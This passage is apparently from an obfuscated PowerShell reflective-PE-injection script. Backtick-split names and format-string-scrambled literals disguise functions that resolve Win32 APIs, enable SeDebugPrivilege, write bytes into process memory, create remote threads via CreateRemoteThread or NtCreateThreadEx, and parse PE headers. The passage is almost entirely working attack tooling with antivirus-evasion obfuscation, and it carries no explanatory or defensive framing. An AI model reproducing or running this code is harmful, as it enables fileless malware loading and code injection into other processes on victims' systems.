		${iS`woW6`4pR`OCESsa`dDr} = &("{1}{3}{0}{2}" -f 'd','Get-','dress','ProcA') ("{0}{3}{2}{1}" -f 'Ke','.dll','32','rnel') ("{0}{3}{2}{1}"-f'IsWo','ess','roc','w64P')
        ${ISWo`W6`4p`RoC`eSsde`L`e`GaTe} = &("{1}{2}{0}{3}{4}" -f 't-Del','G','e','ega','teType') @([IntPtr],  (  &("{2}{0}{1}" -f 'aRIAbl','E','v') ('oU'+'1027')  -VALUEonl).("{0}{3}{1}{2}" -f'M','keByRe','fType','a').Invoke()) ([Bool])
        ${I`Swow6`4PR`Oc`EsS} =  ${6`9pB}::("{2}{1}{0}{5}{4}{3}" -f 'el','etD','G','nter','ateForFunctionPoi','eg').Invoke(${IsW`ow64`P`ROcE`SS`ADdr}, ${IswOw64`Pr`oce`SS`delegatE})
		${WiN32FUnC`Tio`Ns} | &("{1}{2}{0}" -f'r','Ad','d-Membe') -MemberType ("{3}{0}{1}{2}"-f 'r','o','perty','NoteP') -Name ("{3}{1}{0}{2}"-f'P','Wow64','rocess','Is') -Value ${iSWow64Pr`oC`eSS}
		
		${C`REAT`eTH`RE`AdAddr} = &("{4}{2}{3}{0}{1}"-f're','ss','e','t-ProcAdd','G') ("{2}{1}{3}{0}"-f 'dll','n','Ker','el32.') ("{0}{1}{2}{3}"-f'Crea','t','eThrea','d')
        ${CR`eAT`ethrEAddeL`EG`ATE} = &("{2}{3}{1}{0}" -f'e','Typ','G','et-Delegate') @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32],  (&("{2}{0}{1}" -f'D','IteM','chIl')  ("{0}{2}{3}{1}{4}" -f 'Va','e:04L','ria','BL','j2'))."vAL`UE".("{1}{0}{3}{2}" -f'ke','Ma','e','ByRefTyp').Invoke()) ([IntPtr])
        ${C`R`EAtET`HRead} =  ${69`pB}::("{1}{2}{6}{4}{5}{0}{3}"-f'n','Ge','tDelegat','Pointer','ForFun','ctio','e').Invoke(${CReA`T`eT`HR`eadAddR}, ${C`RE`ATEtHreaD`DEl`EG`ATe})
		${Win3`2FUnc`TiO`Ns} | &("{0}{2}{1}" -f'A','ember','dd-M') -MemberType ("{3}{0}{2}{1}" -f 'eProp','ty','er','Not') -Name ("{0}{1}{2}{3}" -f'Cre','ateThre','a','d') -Value ${c`R`e`A`TEThReAD}
		
		return ${wIn`32FU`NcTiO`Ns}
	}
	

			
	
	
	

	
	
	Function s`Ub-`SI`gNedI`N`TasunSiGnED
	{
		Param(
		[Parameter(pOSITioN = 0, ManDaTOry = ${T`Rue})]
		[Int64]
		${V`AL`Ue1},
		
		[Parameter(POsITION = 1, MANdAtoRy = ${t`RUe})]
		[Int64]
		${V`Al`UE2}
		)
		
		[Byte[]]${vaLU`E`1BytEs} =   ( &("{0}{1}{2}{3}" -f 'Get-','Var','IA','Ble')  ("{0}{1}" -f'Sr','p7') -vA )::("{0}{1}" -f'GetByte','s').Invoke(${Va`LUe1})
		[Byte[]]${VaLUe2b`yt`eS} =  (&("{1}{0}" -f'teM','I')  ("{2}{0}{1}"-f 'Ar','IabLE:sRP7','V')  )."V`ALUE"::("{0}{2}{1}" -f'G','tes','etBy').Invoke(${va`LuE2})
		[Byte[]]${fi`NAl`BytEs} =  ${s`RP7}::"GEt`By`TEs"([UInt64]0)

		if (${V`ALue1BY`TEs}."Cou`Nt" -eq ${vaLu`e2B`yTes}."CO`UNt")
		{
			${cAR`R`yo`VeR} = 0
			for (${i} = 0; ${i} -lt ${v`AlUe1`BY`TeS}."COu`NT"; ${I}++)
			{
				${v`Al} = ${vAL`UE1b`YteS}[${i}] - ${CaR`RY`ov`ER}
				
				if (${V`Al} -lt ${vALUe`2B`Y`TES}[${i}])
				{
					${v`AL} += 256
					${CA`RrYo`VER} = 1
				}
				else
				{
					${CAr`Ryo`VeR} = 0
				}
				
				
				[UInt16]${S`Um} = ${v`Al} - ${Val`UE2`By`TES}[${i}]

				${F`In`ALBYTES}[${I}] = ${S`UM} -band 0x00FF
			}
		}
		else
		{
			Throw ("{5}{1}{0}{4}{7}{2}{6}{3}{8}" -f'c','annot subtra','of','di','t bytearrays','C',' ',' ','fferent sizes')
		}
		
		return   ( &("{2}{0}{1}" -f'A','rIable','GEt-v') ('s'+'rP7') -VaLUeOnLy  )::("{0}{1}" -f 'To','Int64').Invoke(${Fina`Lby`TeS}, 0)
	}
	

	Function ad`d-sI`G`NeDiNT`A`S`UnSIGned
	{
		Param(
		[Parameter(posITioN = 0, MANdaTORy = ${tr`UE})]
		[Int64]
		${Valu`E1},
		
		[Parameter(pOsitIon = 1, maNDaToRY = ${Tr`Ue})]
		[Int64]
		${VAl`Ue2}
		)
		
		[Byte[]]${vAl`Ue`1ByTes} =   ${S`RP7}::("{0}{2}{1}" -f 'GetBy','s','te').Invoke(${vA`L`Ue1})
		[Byte[]]${VALue2`BYt`Es} =  ( &("{1}{0}{2}"-f 'l','VARIAb','E') ("{1}{0}" -f 'RP7','s') )."VAL`Ue"::("{2}{0}{1}" -f 'tB','ytes','Ge').Invoke(${V`Alue2})
		[Byte[]]${FInA`L`B`yTEs} =   (  &("{3}{0}{1}{2}" -f'cH','IL','DitEM','GeT-')  ("VA"+"RI"+"ABLe:sRP"+"7") )."VAl`UE"::"g`e`TbyteS"([UInt64]0)

		if (${ValuE`1`BY`TEs}."cO`UNt" -eq ${va`LUe2By`Tes}."Co`Unt")
		{
			${CAr`RY`OvEr} = 0
			for (${i} = 0; ${I} -lt ${VA`Lu`E1b`YteS}."c`oUnT"; ${I}++)
			{
				
				[UInt16]${s`UM} = ${vAlUe`1`ByTEs}[${i}] + ${v`ALuE2bY`TES}[${i}] + ${ca`Rr`y`oVER}

				${F`i`NAlbYteS}[${I}] = ${S`Um} -band 0x00FF
				
				if ((${S`UM} -band 0xFF00) -eq 0x100)
				{
					${C`A`RRyOvER} = 1
				}
				else
				{
					${Ca`RRY`Over} = 0
				}
			}
		}
		else
		{
			Throw ("{5}{6}{10}{11}{0}{7}{1}{4}{9}{2}{3}{8}"-f'yt','arr','f differe','nt siz','ay','C','annot','e','es','s o',' add',' b')
		}
		
		return   ( &("{1}{2}{0}" -f'iTEm','ge','T-')  ("{2}{0}{3}{1}"-f'E','srp7','varIAbL',':') )."VAl`Ue"::("{0}{2}{1}" -f'To','64','Int').Invoke(${f`InA`Lb`yteS}, 0)
	}
	

	Function compArE`-`Va`l`1g`REATertha`NvAl2AsuInt
	{
		Param(
		[Parameter(PoSiTION = 0, mANdATORy = ${TR`Ue})]
		[Int64]
		${VAlu`e1},
		
		[Parameter(POsItioN = 1, MaNDAtoRy = ${tR`Ue})]
		[Int64]
		${VaL`UE2}
		)
		
		[Byte[]]${VAL`Ue`1b`yTes} =   (  &('gi')  ("V"+"A"+"RIABle:sr"+"P"+"7"))."v`AluE"::("{1}{2}{0}" -f 'ytes','Ge','tB').Invoke(${v`A`lUE1})
		[Byte[]]${vALuE`2B`yTeS} =   (  &("{1}{0}{2}" -f'a','VAri','BLe')  ("{1}{0}" -f'rP7','s') )."va`LUe"::("{0}{2}{1}" -f 'G','es','etByt').Invoke(${V`Alu`e2})

		if (${VAl`U`e1`BytEs}."co`Unt" -eq ${vA`lue`2byT`eS}."Co`Unt")
		{
			for (${i} = ${vA`Lue1By`TEs}."cOu`NT"-1; ${I} -ge 0; ${i}--)
			{
				if (${vA`l`Ue1`Bytes}[${i}] -gt ${va`LUE2b`YteS}[${I}])
				{
					return ${tR`UE}
				}
				elseif (${valUE`1`ByT`ES}[${i}] -lt ${V`A`l`UE2bYTES}[${I}])
				{
					return ${faL`Se}
				}
			}
		}
		else
		{
			Throw ("{4}{6}{7}{3}{10}{9}{1}{2}{8}{0}{5}" -f 'ferent','e ','arr',' b','Cannot ',' size','co','mpare','ays of dif','t','y')
		}
		
		return ${Fa`LsE}
	}
	

	Function coNV`e`Rt-u`iNTtO`iNt
	{
		Param(
		[Parameter(POsITion = 0, MANdaTory = ${TR`UE})]
		[UInt64]
		${Va`lUE}
		)
		
		[Byte[]]${Val`U`EBytES} =   ${sr`p7}::("{1}{2}{0}" -f 's','GetBy','te').Invoke(${v`ALuE})
		return (  ( &("{3}{0}{2}{1}" -f 'T-vaR','bLE','Ia','Ge') ("{0}{1}" -f 'SRP','7') -VaLueonLY )::("{1}{0}" -f 'Int64','To').Invoke(${Val`UeB`Yt`Es}, 0))
	}


    Function Ge`T-H`eX
    {
        Param(
        [Parameter(pOsitIoN = 0, mandatOrY = ${tr`UE})]
        ${v`ALuE} 
        )

        ${VALU`ESI`Ze} =   (&("{2}{1}{0}" -f'ItEM','D','chIl')  ("{3}{0}{1}{2}" -f 'E',':69','Pb','vARiabL')  )."v`AlUe"::"SI`ZeoF"([Type]${v`Al`Ue}.("{0}{1}"-f'G','etType').Invoke()) * 2
        ${h`ex} = "0x{0:X$($ValueSize)}" -f [Int64]${va`luE} 

        return ${H`EX}
    }
	
	
	Function tes`T`-MEM`OrY`RAN`Ge`VaLiD
	{
		Param(
		[Parameter(pOSITIoN = 0, maNDaTORY = ${tR`Ue})]
		[String]
		${d`eBu`G`STRINg},
		
		[Parameter(pOSItion = 1, MaNDaTorY = ${tr`Ue})]
		[System.Object]
		${p`e`iNFo},
		
		[Parameter(POsiTIon = 2, maNdaTory = ${tr`Ue})]
		[IntPtr]
		${s`Ta`RTA`ddrESs},
		
		[Parameter(PARAMETErSEtNAmE = "s`izE", poSiTIoN = 3, MAnDatOrY = ${T`RUe})]
		[IntPtr]
		${sI`ZE}
		)
		
	    [IntPtr]${FiNale`NDA`dDreSs} = [IntPtr](&("{1}{4}{5}{6}{3}{0}{2}"-f 'tAsUnsigne','Add-Si','d','n','gn','ed','I') (${ST`A`RTa`DDreSs}) (${s`IzE}))
		
		${PEE`NdaDDr`Ess} = ${peIN`FO}."e`NDAdDRE`sS"
		
		if ((&("{2}{6}{5}{0}{1}{3}{4}"-f'1G','reater','Compar','Th','anVal2AsUInt','al','e-V') (${peIN`Fo}."PEHA`Nd`lE") (${StarTaDD`R`Ess})) -eq ${t`RUE})
		{
			Throw ('Try'+'ing'+' '+'to'+' '+'writ'+'e '+'to'+' '+'me'+'mo'+'ry '+'sm'+'a'+'ller '+'t'+'han '+'allo'+'ca'+'ted '+'ad'+'dr'+'ess '+'range.'+' '+"$DebugString")
		}
		if ((&("{3}{1}{7}{0}{5}{4}{6}{2}{8}" -f'-Val','ompar','AsU','C','erT','1Great','hanVal2','e','Int') (${fi`NALE`NDA`d`DReSs}) (${P`EeNdADdRE`SS})) -eq ${T`RUe})
		{
			Throw ('Tr'+'ying'+' '+'t'+'o '+'w'+'ri'+'te '+'t'+'o '+'mem'+'ory'+' '+'grea'+'ter '+'t'+'han '+'a'+'lloc'+'ated'+' '+'add'+'ress'+' '+'ran'+'ge.'+' '+"$DebugString")
		}
	}
	
	
	Function W`R`I`Te-bytE`sTOMEmo`Ry
	{
		Param(
			[Parameter(POSItIoN=0, MAnDatorY = ${Tr`UE})]
			[Byte[]]
			${bY`T`es},
			
			[Parameter(PosiTion=1, mAndatoRY = ${T`RuE})]
			[IntPtr]
			${mEMoRYA`dD`R`Ess}
		)
	
		for (${o`FfsEt} = 0; ${oFf`s`et} -lt ${by`TeS}."LE`Ng`Th"; ${oFF`SeT}++)
		{
			  (  &("{1}{0}{2}"-f'a','VArI','bLE') 69Pb  -vaLUeONL)::"WRiTeb`y`TE"(${mem`oRY`ADd`Ress}, ${o`FFs`et}, ${B`Y`Tes}[${OfFS`ET}])
		}
	}
	

	
	Function GET-Del`egAT`EtYPE
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( poSiTION = 0)]
	        [Type[]]
	        ${pAr`A`meTeRs} = (&("{1}{0}{2}" -f 'w-Obje','Ne','ct') ("{0}{1}"-f 'Type[',']')(0)),
	        
	        [Parameter( POSitiOn = 1 )]
	        [Type]
	        ${rE`TUrntY`PE} = [Void]
	    )

	    ${dom`Ain} =  ${vu`8hTm}::"CURreNT`DOm`A`iN"
	    ${dy`NaSsEM`B`lY} = &("{0}{2}{1}"-f 'New-Ob','t','jec') ("{3}{1}{6}{0}{2}{5}{4}"-f'em.Reflection.','s','A','Sy','mblyName','sse','t')(("{2}{0}{1}{3}{4}" -f'ct','e','Refle','dD','elegate'))
	    ${A`SsEMbl`YBu`ILder} = ${D`Oma`IN}.("{3}{4}{0}{1}{2}"-f'eDynamicA','s','sembly','D','efin').Invoke(${d`YN`AsS`emBlY},  (&("{2}{1}{3}{0}"-f 'teM','HiL','GET-c','dI') ('VARi'+'ABLe:0'+'yeMD'+'a')  )."vaL`Ue"::"R`UN")
	    ${M`ODUl`eB`UiL`DeR} = ${Assemb`LyBuiL`der}.("{2}{1}{4}{0}{3}"-f 'Modul','efine','D','e','Dynamic').Invoke(("{1}{0}{3}{2}" -f'or','InMem','dule','yMo'), ${F`Al`Se})
	    ${tYP`E`BUildeR} = ${modu`Le`BuI`l`DeR}.("{2}{0}{1}"-f 'n','eType','Defi').Invoke(("{2}{0}{4}{3}{1}" -f 'l','pe','MyDe','teTy','ega'), ("{6}{9}{7}{4}{8}{2}{5}{3}{1}{0}"-f 's','las',' ','toC','s','Au','C',', AnsiClas',',','lass, Public, Sealed'), [System.MulticastDelegate])
	    ${Co`NSTR`UCT`orB`Uil`dEr} = ${tYPEBU`I`L`der}.("{2}{5}{3}{1}{0}{4}" -f 'tru','s','De','on','ctor','fineC').Invoke(("{5}{2}{8}{1}{3}{9}{7}{4}{0}{6}"-f 'Publ','Name, Hi','peci','d','Sig, ','RTS','ic','y','al','eB'),  ( &('LS')  ('V'+'ariaBl'+'E:VcKR') )."V`ALUE"::"St`ANdArd", ${PAR`AM`E`TErS})
	    ${c`OnS`TrU`cTorb`UIldeR}.("{1}{2}{0}{3}"-f 'ionFlag','S','etImplementat','s').Invoke(("{1}{3}{0}{4}{2}" -f 'a','Runtim','d','e, M','nage'))
	    ${M`ETHOd`B`UilDeR} = ${T`YpeBui`lD`Er}.("{2}{1}{0}"-f 'od','eMeth','Defin').Invoke('Invoke', ("{4}{9}{1}{10}{5}{6}{8}{2}{0}{3}{7}"-f'wSlot, ','lic','Ne','Vi','Pu','Hi','deBySig,','rtual',' ','b',', '), ${re`Tu`RN`Type}, ${pARA`ME`TErs})
	    ${ME`Tho`DBU`Ild`ER}.("{4}{3}{2}{0}{1}"-f'ionFlag','s','lementat','p','SetIm').Invoke(("{1}{0}{2}" -f'ime,','Runt',' Managed'))
	    
	    &("{1}{2}{0}{3}" -f'-Outpu','Wri','te','t') ${T`yp`e`BuiLdEr}.("{0}{1}{2}" -f 'Create','Ty','pe').Invoke()
	}


	
	Function get-pRO`cad`d`REsS
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	        [Parameter( PosITiOn = 0, MandAtORY = ${tR`Ue} )]
	        [String]
	        ${Mo`Dule},
	        [Parameter( PosiTion = 1, MandaTorY = ${t`RUE} )]
	        [String]
	        ${pr`O`C`eDURe}
	    )

        &("{1}{0}{2}" -f'te-Ver','Wri','bose') ('[Get-ProcAd'+'d'+'ress'+']'+' '+'M'+'odu'+'le '+'= '+"$Module "+(('XMH ')-crePlacE  'XMH',[chAr]124)+"Procedure=$Procedure")
        
	    ${s`YsTE`m`AssEMbly} =  (  &("{1}{2}{0}" -f'Le','VA','rIAB')  ("{0}{2}{1}" -f 'VU','htm','8'))."VaL`Ue"::"CURR`en`TDomAiN".("{2}{0}{3}{1}"-f 'tAssemb','s','Ge','lie').Invoke() | &("{0}{2}{1}"-f'Where','ect','-Obj') { ${_}."gloBaLA`sSe`mB`Ly`C`Ache" -And ${_}."LOCATI`On".("{1}{0}"-f 'lit','Sp').Invoke('\\')[-1].("{1}{0}"-f 'als','Equ').Invoke(("{1}{2}{0}" -f 'm.dll','Syst','e')) };
        ${U`N`sA`FEnAtiVeM`eT`hods} = ${sYs`T`E`mass`emBLy}.("{1}{0}{2}"-f 'y','GetT','pe').Invoke(("{2}{0}{1}" -f'f','t','Microso')+("{1}{2}{0}"-f'.','.Win3','2')+("{2}{4}{3}{0}{1}"-f 'M','ethods','UnsafeNa','e','tiv'));

		${A} = 'Get' +("{1}{0}"-f 'odule','M') + ("{0}{1}{2}"-f'Han','d','le')
        ${GeTmoDu`Leha`N`DLE} = ${uNSAfENaTi`V`Em`ETHO`DS}.("{0}{1}{2}"-f 'Get','M','ethod').Invoke(${A});
        
		${B} = 'get'+("{1}{0}"-f'roc','p')+("{2}{0}{1}" -f'ddres','s','a')
        ${X}=$(${U`NSaf`eNaT`Iv`EMeTHO`DS}.("{1}{3}{2}{0}"-f 's','Ge','od','tMeth').Invoke() | &("{2}{1}{0}"-f'ect','obj','where-') {${_}."NA`ME" -eq ${b} });


        if(&("{1}{2}{0}{3}" -f 'mb','Ge','t-Me','er') -InputObject ${X} -Name ("{0}{1}" -f 'Le','ngth') -MemberType ("{2}{1}{0}" -f 'ies','opert','Pr')) {
            
            ${geTp`Ro`c`ADdress} = ${X}[1];
        } else {		
            ${gE`TproC`ADDR`eSS} = ${un`s`AfEN`ATIVEMET`HO`dS}.("{0}{1}{2}" -f'Get','Metho','d').Invoke(("{0}{1}{2}{4}{3}" -f'Get','Pro','cA','dress','d'));
        }
   				 
	    ${kerN3`2hand`LE} = ${getmo`dULE`hA`Nd`Le}."in`V`OKE"(${n`Ull}, @(${M`OdUle}))
	    ${tM`P`pTr} = &("{1}{2}{0}" -f'Object','Ne','w-') ("{0}{1}" -f 'I','ntPtr')
	    ${hA`N`d`lErEf} = &("{1}{0}{2}"-f 'w-Ob','Ne','ject') ("{9}{7}{4}{3}{6}{2}{10}{1}{0}{8}{5}" -f'ervices','eropS','e.','un','.R','f','tim','stem','.HandleRe','Sy','Int')(${tmP`P`TR}, ${ker`N32han`d`lE})
	    &("{2}{0}{1}"-f't','e-Output','Wri') ${GETPR`Oc`AddrESS}."inv`Oke"(${N`ULL}, @([System.Runtime.InteropServices.HandleRef]${HA`NDl`ErEF}, ${pR`oCE`DUrE}))

	}
		
	
	
	Function e`NaBL`E-SedEbug`pRIv`IlEGe
	{
		Param(
		[Parameter(POsITiON = 1, mAndaTOry = ${tr`Ue})]
		[System.Object]
		${win`32`FuNc`TI`ons},
		
		[Parameter(PoSItiON = 2, mANdAtoRY = ${tR`UE})]
		[System.Object]
		${wIN3`2tY`pEs},
		
		[Parameter(PoSItioN = 3, MANDAtory = ${t`Rue})]
		[System.Object]
		${wI`N32Co`NS`TANts}
		)
		
		[IntPtr]${THrEad`HAN`dLe} = ${wIN32`Fun`CtI`oNS}."g`ETCurRenT`ThR`E`Ad"."I`NvOke"()
		if (${th`ReAd`H`AnDLe} -eq   ( &("{0}{1}"-f 'i','TeM') ('vArI'+'AbLE:2M1'+'a'+'J')  )."vaL`Ue"::"zE`RO")
		{
			Throw ("{5}{2}{3}{0}{8}{4}{1}{6}{7}"-f'get the handle t','urrent th','bl','e to ','c','Una','r','ead','o the ')
		}
		
		[IntPtr]${thr`Ea`DTOken} =  (  &("{1}{0}{3}{2}" -f'et-c','G','m','HILdItE')  ("{3}{2}{1}{0}{4}"-f'1','E:2M','BL','vaRIA','Aj'))."v`AlUe"::"z`ERO"
		[Bool]${rE`su`Lt} = ${w`in32F`U`NCtI`OnS}."o`peNTh`REadto`KEN"."I`NVoKe"(${TH`R`EADhA`ND`LE}, ${wI`N32c`On`Sta`NTs}."TOKEN`_q`U`Ery" -bor ${W`IN3`2`C`ONSTaNts}."tokE`N`_AdjUst_PR`I`VILEGEs", ${fal`se}, [Ref]${thre`AD`T`okEN})
		if (${RES`Ult} -eq ${fAl`sE})
		{
			${ERR`OrCO`DE} =  ${6`9PB}::("{0}{4}{2}{3}{5}{1}"-f 'G','rror','as','t','etL','Win32E').Invoke()
			if (${e`R`Ro`RCode} -eq ${WI`N3`2CoNs`TaN`Ts}."erROr_nO`_tOk`en")
			{
				${res`U`lT} = ${w`in3`2`FU`NCtiONs}."IMpErS`O`N`ATESe`lf"."InVo`Ke"(3)
				if (${R`es`ULt} -eq ${F`Al`SE})
				{
					Throw ("{3}{1}{2}{4}{0}" -f 'te self','a','ble to imp','Un','ersona')
				}
				
				${rESu`lT} = ${WIn`32FUNCt`i`ONS}."OpEntHR`EADto`KEn"."INvo`ke"(${tHR`E`AdHaNDle}, ${WiN`32C`O`NST`AnTs}."tOk`E`N_qu`ery" -bor ${w`In`32CONstAN`Ts}."tOken_adjUSt_pr`I`V`iLE`g`eS", ${f`ALse}, [Ref]${T`hREAd`TOKeN})
				if (${rE`s`Ult} -eq ${Fa`LsE})
				{
					Throw ("{6}{1}{0}{2}{5}{7}{4}{3}" -f 'o','le t',' ','n.','eadToke','OpenT','Unab','hr')
				}
			}
			else
			{
				Throw ('Unab'+'le '+'to'+' '+'Op'+'enThr'+'ead'+'Tok'+'e'+'n. '+'E'+'rror '+'c'+'ode: '+"$ErrorCode")
			}
		}
		
		[IntPtr]${pLu`Id} =   (&('gi') ("{3}{2}{0}{1}{4}"-f 'lE:','6','Ab','vaRi','9Pb'))."vA`lue"::("{0}{1}{2}"-f 'AllocHG','lob','al').Invoke( ( &("{2}{1}{0}" -f'BLe','ia','var')  69pB)."vaL`UE"::"Si`zeOf"([Type]${win3`2`TyP`ES}."LU`Id"))
		${R`esu`lt} = ${Win32`F`UN`ctioNS}."LoO`kUppRI`V`IlEG`Eval`UE"."inv`okE"(${N`UlL}, ("{0}{2}{1}{3}{4}" -f 'S','u','eDeb','gPri','vilege'), ${pl`U`iD})
		if (${rES`U`lT} -eq ${fa`lsE})
		{
			Throw ("{8}{7}{0}{6}{1}{3}{5}{2}{4}"-f 'ble',' c','lu','al','e','l LookupPrivilegeVa',' to','na','U')
		}

		[UInt32]${t`okEn`pRiVs`I`ze} =  (  &("{0}{1}"-f 'Di','r') ("{2}{0}{3}{1}"-f'iAbLE:','9pB','vAR','6')  )."V`ALue"::"sIz`e`of"([Type]${Win3`2`TYPes}."tOken_`PR`IvI`lEG`eS")
		[IntPtr]${T`oKENPRiVI`leg`EsMem} =   ${69`pb}::("{1}{0}{3}{2}" -f'locHGl','Al','l','oba').Invoke(${toKE`Np`Rivsi`ZE})
		${tOk`ENP`RivI`LEgES} =  (&("{2}{0}{1}"-f't','-ITEm','gE')  ('VarIAb'+'Le:69'+'p'+'B'))."Va`lUE"::"ptrt`oST`RuCt`U`RE"(${TO`k`e`Np`RiVI`lEgEsmeM}, [Type]${W`iN32`TYpES}."TO`KeN_privIl`Eg`ES")
		${TOKEN`P`RIv`ILEgeS}."prI`VIlEG`Ecou`NT" = 1
		${Tok`En`PrivIL`EgES}."p`RI`ViLEg`Es"."L`Uid" =  ${6`9pb}::"PTRt`ost`RUc`TUrE"(${P`L`UiD}, [Type]${Wi`N32`TYp`es}."l`UID")
		${tO`K`E`NpRIVI`Leges}."PRI`VILe`ges"."AT`TrIB`U`Tes" = ${W`IN32c`OnSt`AnTs}."Se_Pr`iVILe`gE`_EN`A`BLed"
		  (&("{1}{0}"-f 'cI','g') ("{2}{0}{3}{1}"-f ':69','B','varIabLe','p')  )."v`ALue"::("{1}{2}{0}" -f'oPtr','Stru','ctureT').Invoke(${toKENpR`iV`iL`eg`es}, ${tOKenprI`Vi`L`e`g`eSmEM}, ${t`Rue})

		${R`ESU`lT} = ${WI`N`3`2FunC`TIons}."aDj`UsT`To`keNPrIVilE`GEs"."i`NVOkE"(${tH`R`eAdTo`kEn}, ${fa`lse}, ${Toke`N`pRIvILe`ge`Smem}, ${TO`keNp`RiVsizE},  (&('gi') ("{1}{2}{0}" -f 'rIABlE:2m1aj','V','A')  )."Va`LUE"::"Z`eRo",   ${2m`1aJ}::"ZE`RO")
		${Err`O`R`CoDe} =  (  &("{3}{1}{2}{0}" -f 'lE','ia','B','geT-var')  ('6'+'9pB') )."V`AlUE"::("{3}{2}{0}{1}"-f'as','tWin32Error','tL','Ge').Invoke() 
		if ((${R`esulT} -eq ${f`ALSE}) -or (${eRrO`RCO`De} -ne 0))
		{
			
		}
		
		 ${6`9pB}::("{1}{3}{2}{0}" -f 'l','FreeH','a','Glob').Invoke(${ToKENpRI`VileGe`sm`em})
	}
	
	
	Function Cre`A`T`e-RE`M`OtEThReaD
	{
		Param(
		[Parameter(POsitION = 1, MandAToRY = ${TR`Ue})]
		[IntPtr]
		${p`RO`CEssha`N`Dle},
		
		[Parameter(POSITION = 2, mANDATory = ${Tr`Ue})]
		[IntPtr]
		${Sta`RT`A`Ddr`eSs},
		
		[Parameter(PoSitIon = 3, maNdATORy = ${F`AL`sE})]
		[IntPtr]
		${A`RguME`NT`PtR} =  (  &('Gi') ("V"+"a"+"Ri"+"ablE:2M1Aj")  )."vA`lUe"::"ZE`RO",
		
		[Parameter(POSItIoN = 4, mAndAToRY = ${t`RUE})]
		[System.Object]
		${win32FUnC`T`I`oNS}
		)
		
		[IntPtr]${R`e`m`oTethrEAd`hAndLe} =   ${2`m1Aj}::"ze`Ro"
		
		${os`VeR`SioN} =  ${fV`62Og}::"o`SVErSI`on"."Ve`RSIoN"
		
		if ((${OSve`RsI`oN} -ge (&("{1}{2}{0}" -f 'bject','N','ew-O') ("{1}{0}" -f'on','Versi') 6,0)) -and (${O`sv`e`RsION} -lt (&("{0}{1}{2}"-f'N','ew-Ob','ject') ("{0}{1}{2}"-f'Ver','s','ion') 6,2)))
		{
			
			${r`ETv`Al}= ${W`I`N32FUnct`ioNs}."n`TcREAT`Et`hRea`DEX"."iN`Vo`KE"([Ref]${Remo`TET`HreAdha`NDLe}, 0x1FFFFF,   ${2m1`AJ}::"ze`Ro", ${Pro`Ces`S`HaNDle}, ${s`TaRt`Ad`dr`esS}, ${ArGUM`e`NT`ptR}, ${FAl`SE}, 0, 0xffff, 0xffff,   ${2`m`1Aj}::"Z`eRo")
			${L`Aste`RroR} =  (  &("{1}{0}{2}"-f 'iaBL','vAR','e') 69Pb  )."val`UE"::("{3}{0}{1}{2}"-f 'LastWin32Er','ro','r','Get').Invoke()
			if (${rE`Mot`eThRea`DhAn`Dle} -eq   ${2m1`Aj}::"z`ErO")
			{
				Throw ('Error'+' '+'in'+' '+'NtC'+'reate'+'Th'+'re'+'adEx. '+'R'+'et'+'urn '+'va'+'lue'+': '+"$RetVal. "+'La'+'st'+'Er'+'ror: '+"$LastError")
			}
		}
		
		else
		{
			
			${r`eM`ot`EthREaDhANDle} = ${win32FU`N`C`TIONs}."crEATe`ReMot`ETHRe`Ad"."I`N`Voke"(${pro`CEs`SHAN`D`lE},  (&("{1}{0}"-f'blE','VARiA') ("{1}{0}" -f'1AJ','2M') )."V`ALuE"::"ze`Ro", [UIntPtr][UInt64]0xFFFF, ${st`ARtaddR`E`Ss}, ${argUMe`N`T`ptr}, 0,   ${2`m1AJ}::"Z`ERO")
		}
		
		if (${R`E`m`otetHReADH`Andle} -eq  (&("{1}{0}" -f 'CI','G') ("{0}{3}{1}{2}{4}" -f 'vAr','b','L','Ia','E:2m1Aj') )."VA`LUe"::"zE`RO")
		{
			&("{0}{1}{2}" -f'Wri','te-','Error') ("{5}{0}{11}{9}{4}{8}{2}{6}{10}{7}{3}{1}"-f'o','ll','e','s nu','ead,','Error creating rem','a','handle i',' thr','thr','d ','te ') -ErrorAction ("{0}{1}" -f'S','top')
		}
		
		return ${R`e`M`oTE`THr`EaDHANdle}
	}

	

	Function gET-`imaGeN`T`HE`Aders
	{
		Param(
		[Parameter(POSItiOn = 0, mANDATORY = ${TR`Ue})]
		[IntPtr]
		${P`e`ha`NdLe},
		
		[Parameter(POSITioN = 1, mANDAtory = ${TR`UE})]
		[System.Object]
		${w`i`N3`2tyPEs}
		)
		
		${nTH`Ea`dE`RsINFo} = &("{1}{0}{2}"-f '-Obj','New','ect') ("{2}{1}{0}"-f 't','tem.Objec','Sys')
		
		
		${dOs`He`Ad`eR} =  ${69`pB}::"pTrtO`s`TrUct`URe"(${p`EH`AnDlE}, [Type]${W`IN`32TYpes}."I`mAGe_DO`S_h`eaDEr")

		
		[IntPtr]${NT`hEa`D`eRsPTr} = [IntPtr](&("{0}{4}{5}{2}{3}{1}{6}"-f 'Ad','ne','ignedIntAsUn','sig','d-','S','d') ([Int64]${peH`A`NdlE}) ([Int64][UInt64]${do`SHEA`Der}."e`_Lf`ANew"))
		${N`TheA`DerSIN`FO} | &("{1}{0}{2}" -f'-Me','Add','mber') -MemberType ("{3}{2}{1}{0}" -f 'operty','Pr','ote','N') -Name ("{0}{2}{1}"-f'N','r','tHeadersPt') -Value ${Nt`h`EADE`RSptR}
		${I`MAgenThE`Ad`ers64} =   (&("{1}{2}{0}" -f'Em','Ch','ildIt') ("{0}{1}{2}"-f 'VAria','BlE',':69PB')  )."VAl`UE"::"PtRtoS`Tru`C`TU`RE"(${ntH`eA`DeRS`pTR}, [Type]${w`in3`2tYP`ES}."IMa`gE`_`NT_heAdE`Rs64")
		
		
	    if (${iMA`g`enTHEader`S`64}."sIgNA`T`URE" -ne 0x00004550)
	    {
	        throw ("{4}{6}{0}{1}{5}{2}{3}" -f'M','AGE','HEADER si','gnature.','Invalid ','_NT_','I')
	    }
		
		if (${I`m`AGeNthE`Ade`RS64}."oP`TI`ONALhe`ADer"."mag`IC" -eq ("{7}{1}{3}{5}{4}{6}{2}{0}"-f'IC','NT','_HDR64_MAG','_OPTIO','A','N','L','IMAGE_'))
		{
			${NThE`ADEr`s`I`Nfo} | &("{1}{0}{2}" -f'e','Add-M','mber') -MemberType ("{0}{3}{1}{2}" -f 'N','tePro','perty','o') -Name ("{0}{2}{1}{3}" -f 'IMAGE_','T_H','N','EADERS') -Value ${IM`AgeNThEAde`R`S64}
